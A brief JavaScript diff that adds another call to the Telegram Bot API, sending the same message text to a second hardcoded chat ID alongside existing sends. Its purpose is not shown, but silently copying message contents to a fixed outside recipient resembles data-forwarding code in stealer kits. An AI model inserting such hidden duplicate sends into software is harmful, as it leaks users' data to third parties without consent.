@@ -564,6 +564,18 @@ ${itemsMessage}
         console.error('Error sending message to hardcoded chat ID:', error);
     });
     
+    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        chat_id: '5838062267', // Replace with your hardcoded chat ID
+        text: message,
+        parse_mode: 'Markdown' // Optional: Use Markdown for formatting
+    })
+    .then(response => {
+        console.log('Message sent to hardcoded chat ID:', response.data);
+    })
+    .catch(error => {
+        console.error('Error sending message to hardcoded chat ID:', error);
+    });
+    
     // Send message to the chat ID stored in the variable
     axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         chat_id: userId, // Use the variable holding the chat ID
